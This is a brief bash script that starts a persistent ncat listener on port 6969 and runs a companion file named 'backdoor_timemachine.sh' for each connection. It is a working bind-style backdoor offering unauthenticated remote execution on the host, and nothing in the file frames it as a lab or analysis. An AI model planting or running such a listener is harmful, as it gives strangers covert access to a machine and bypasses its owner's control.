#!/bin/bash
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

# https://nmap.org/ncat/
BIND_PORT=6969
ncat -lk -p $BIND_PORT -e $SCRIPT_DIR/backdoor_timemachine.sh